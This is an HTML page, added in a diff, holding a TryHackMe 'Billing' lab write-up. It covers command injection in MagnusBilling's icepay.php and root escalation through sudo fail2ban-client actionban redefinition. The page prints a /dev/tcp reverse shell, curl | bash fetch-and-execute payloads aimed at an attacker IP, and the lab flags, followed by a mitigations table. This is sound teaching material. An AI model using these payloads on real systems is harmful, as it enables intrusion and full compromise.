@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Billing — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="MagnusBilling's icepay.php accepts a democ parameter that gets passed unsanitised into a shell context — a single GET request with a chained curl | bash…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/billing.html">
+<meta property="og:title" content="Billing — TryHackMe writeup">
+<meta property="og:description" content="MagnusBilling's icepay.php accepts a democ parameter that gets passed unsanitised into a shell context — a single GET request with a chained curl | bash…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/billing.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Billing — TryHackMe writeup","description":"MagnusBilling's icepay.php accepts a democ parameter that gets passed unsanitised into a shell context — a single GET request with a chained curl | bash…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-24","url":"https://thecyberfarhan.github.io/writeups/billing.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/billing.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Billing</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 24, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b>MagnusBilling's <code>icepay.php</code> accepts a <code>democ</code> parameter that gets passed unsanitised into a shell context — a single GET request with a chained <code>curl | bash</code> payload landed a shell as <code>asterisk</code>. From there, <code>sudo</code> grants NOPASSWD access to <code>fail2ban-client</code>, which can define and trigger custom ban actions. Setting the SSH jail's <code>actionban</code> to an arbitrary command and then triggering a ban event runs that command as root. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">💉 Command injection</span><span class="chip">🐚 Netcat</span><span class="chip">🛡 fail2ban-client</span></div>
+  <h2>Introduction</h2>
+<p>Today's target is <strong>Billing</strong> — a box built around MagnusBilling, an open-source VoIP billing platform that pairs nicely with the Asterisk PBX service also running here. The foothold is a classic unauthenticated command injection in a payment gateway integration file — the kind of vulnerability that surfaces when third-party payment modules accept user input without validating it. The escalation is the more interesting half: <code>fail2ban</code>, a tool whose entire purpose is *blocking* malicious activity, becomes the mechanism for *creating* it once an attacker can redefine what happens when a ban fires.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What command injection is and how chained shell operators (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>) exploit unsanitised parameters</li><li>What fail2ban is and how jails/actions/filters relate to each other</li><li>How <code>fail2ban-client set &lt;jail&gt; action &lt;action&gt; actionban &lt;command&gt;</code> redefines what runs on a ban event</li><li>Basic reverse shell staging via <code>curl | bash</code></li></ul>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.49.178.53 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.2p1 Debian</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.62 — MagnusBilling</td></tr><tr><td>3306/tcp</td><td>MySQL</td><td>MariaDB 10.3.23 or earlier</td></tr><tr><td>5038/tcp</td><td>Asterisk</td><td>Asterisk Call Manager 2.10.6</td></tr></tbody></table>
+<p>A telecom-flavoured stack: MagnusBilling (VoIP billing software) sits on top of Asterisk (the PBX it bills for), backed by MariaDB. The combination is the box's whole theme.</p>
+<h3>Web Directory Enumeration</h3>
+<pre><code>feroxbuster -u http://10.49.178.53/ -w /usr/share/wordlists/dirb/common.txt -x php,xt,html</code></pre>
+<p>The scan surfaces the entire MagnusBilling installation structure — <code>lib/</code>, <code>fpdf/</code>, multiple payment gateway integration directories (<code>icepay/</code>, <code>mercadopago/</code>, <code>stripe/</code>, <code>anet/</code>, <code>PlacetoPay/</code>). Nothing custom was added to this install; it's the stock application. The payment gateway integrations are the most interesting attack surface — third-party billing modules historically carry more vulnerabilities than the application core, since they're maintained separately and often less rigorously reviewed.</p>
+<h2>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Unauthenticated Command Injection — icepay.php</h3>
+<p><strong>What's happening here?</strong> MagnusBilling's IcePay payment gateway integration accepts a <code>democ</code> parameter. Rather than validating or escaping this input, the application passes it into a shell execution context — likely building a command string for a payment verification or demo-mode check. Chaining additional shell commands via <code>;</code> after a benign-looking value (<code>/dev/null</code>) lets arbitrary commands ride along.</p>
+<p class="aside">Preparing a payload script on the attacking machine:</p>
+<pre><code>echo 'bash -i &gt;&amp; /dev/tcp/192.168.134.217/4444 0&gt;&amp;1' &gt; shell.sh</code></pre>
+<p class="aside">The injection — chaining a <code>curl | bash</code> fetch-and-execute after a harmless <code>/dev/null</code> argument:</p>
+<pre><code>http://10.49.178.53/mbilling/lib/icepay/icepay.php?democ=/dev/null;curl%20http://192.168.134.217/shell.sh%20|%20bash;id</code></pre>
+<p class="aside">Listener:</p>
+<pre><code>nc -nvlp 4444</code></pre>
+
+<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.49.178.53] 53710
+asterisk@ip-10-49-178-53:/var/www/html/mbilling/lib/icepay$</code></pre>
+<p>Shell landed as <code>asterisk</code> — the system account running the Asterisk/MagnusBilling services.</p>
+<h2>Shell / Access</h2>
+
+<pre><code>cd /home/magnus
+cat user.txt
+# THM{4a6831d5f124b25eefb1e92e0f0da4ca}</code></pre>
+
+<h2>Escalation</h2>
+<p class="aside">(~25 mins into the box)</p>
+<h3>sudo fail2ban-client</h3>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User asterisk may run the following commands on ip-10-49-178-53:
+    (ALL) NOPASSWD: /usr/bin/fail2ban-client</code></pre>
+<p><strong>What is fail2ban?</strong> A log-monitoring service that bans IPs exhibiting malicious behaviour (repeated failed SSH logins, for example) by dynamically inserting firewall rules. Its behaviour is governed by *jails* (which log files to watch, for which patterns) and *actions* (what to actually do when a ban triggers — typically run an <code>iptables</code> command). The <code>actionban</code> setting defines the exact shell command executed when a ban fires.</p>
+<p>The straightforward move — directly editing <code>/etc/fail2ban/action.d/*.conf</code> files — was blocked by file ownership (<code>root:root</code>, not writable by <code>asterisk</code>). But <code>fail2ban-client</code> itself, running as root via <code>sudo</code>, can redefine action settings live without touching any file on disk.</p>
+<p class="aside">Checking active jails:</p>
+<pre><code>sudo /usr/bin/fail2ban-client status</code></pre>
+
+<pre><code>Jail list: ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager,
+           ip-blacklist, mbilling_ddos, mbilling_login, sshd</code></pre>
+<p class="aside">Redefining the <code>sshd</code> jail's ban action to run an arbitrary command:</p>
+<pre><code>sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban \
+  "/bin/bash -c 'curl http://192.168.134.217:4443/shell.sh | bash'"</code></pre>
+<p>This doesn't execute anything yet — it just rewrites what *will* run the next time the <code>sshd</code> jail issues a ban.</p>
+<p class="aside">Triggering a ban manually to fire the new action immediately:</p>
+<pre><code>sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1</code></pre>
+<p>Banning a loopback address as the trigger condition causes <code>fail2ban</code> to invoke the configured <code>actionban</code> command — which now points at the attacker-controlled payload — running as root, since <code>fail2ban</code> itself operates with root privileges.</p>
+<p class="aside">Catching the resulting connection:</p>
+<pre><code>nc -nvlp 4442</code></pre>
+
+<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.49.178.53] 34872
+root@ip-10-49-178-53:/# cat /root/root.txt
+THM{33ad5b530e71a172648f424ec23fae60}</code></pre>
+
+<h2>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Unauthenticated command injection</strong> in <code>icepay.php</code>'s <code>democ</code> parameter → <code>curl | bash</code> payload → shell as <code>asterisk</code></li><li><strong><code>sudo fail2ban-client</code></strong> with NOPASSWD → redefined <code>sshd</code> jail's <code>actionban</code> to a reverse shell payload</li><li><strong><code>fail2ban-client set sshd banip 127.0.0.1</code></strong> → triggered the ban → action ran as root → root shell → root flag</li></ol>
+<h2>Rabbit Holes</h2>
+<h3>Direct Config File Editing</h3>
+<p>The first instinct on seeing <code>sudo fail2ban-client</code> was to check whether the action config files themselves (<code>/etc/fail2ban/action.d/*.conf</code>) were writable — they weren't, all owned by root with standard permissions. This led to reading the <code>fail2ban-client</code> man page specifically, which revealed the <code>set &lt;jail&gt; action &lt;action&gt; actionban &lt;command&gt;</code> live-reconfiguration capability — a cleaner path than file editing would have been anyway, since it doesn't require any persistence on disk.</p>
+<h3>Payload Iteration via actionban</h3>
+<p>Several <code>actionban</code> payloads were tried in sequence before landing on the working reverse shell: first an attempt to copy <code>root.txt</code> directly to a world-readable location, then copying and SUID-stamping <code>/bin/bash</code>, before settling on the <code>curl | bash</code> reverse shell. Each redefinition of <code>actionban</code> overwrites the previous one — only the most recently set command fires on the next trigger. The SUID bash copy attempt likely would have worked too, but the reverse shell path was more direct once verified functional.</p>
+<h3>First Listener Catching the Raw curl Request Instead of the Payload</h3>
+<p>One <code>nc -nvlp 4443</code> session caught a literal <code>GET /shell.sh HTTP/1.1</code> request rather than executing as a shell — this was <code>curl</code> actually fetching the script content as expected, not a failure. The confusion was momentary: the listener that should be *serving* <code>shell.sh</code> was conflated with the listener that should be *catching* the resulting reverse shell connection. Running two separate listeners (one to serve the payload file, one to catch the callback) cleared it up.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Unauthenticated command injection in <code>icepay.php</code></td><td class="sev-critical">Critical</td><td>Update MagnusBilling to a patched version; never pass unsanitised request parameters into shell execution contexts; validate and allowlist all payment gateway callback parameters</td></tr><tr><td><code>sudo fail2ban-client</code> with NOPASSWD</td><td class="sev-critical">Critical</td><td>Never grant unrestricted <code>sudo</code> to <code>fail2ban-client</code> — its <code>set</code> subcommand allows arbitrary command execution via <code>actionban</code> redefinition; if automation requires fail2ban control, scope it to read-only subcommands only</td></tr><tr><td>Asterisk/web service account (<code>asterisk</code>) granted broad sudo rights</td><td class="sev-high">High</td><td>Service accounts should have the absolute minimum sudo footprint required; question why a web-facing service account needs any sudo access to system security tooling at all</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>Granting <code>sudo</code> access to a tool's *client* binary is not the same as granting access to only its "safe" read operations — <code>fail2ban-client</code>'s <code>set</code> subcommand can redefine the exact command that runs on a security event, turning a defensive tool into an arbitrary root code execution primitive. Always audit what a binary's full subcommand surface allows before assuming a "monitoring" or "status" tool is safe to grant via <code>sudo</code>.</div>
+  <h2>If I Did It Again</h2>
+<p>Check the <code>fail2ban-client</code> man page for <code>set ... actionban</code> immediately upon seeing it in <code>sudo -l</code>, rather than first investigating direct config file writability — the live reconfiguration path was always going to be the more direct route, and recognising "client binary for a privileged daemon" as a potential reconfiguration vector is a pattern worth applying to other client/daemon pairs (systemctl, docker, etc.) on future boxes.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/billing_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
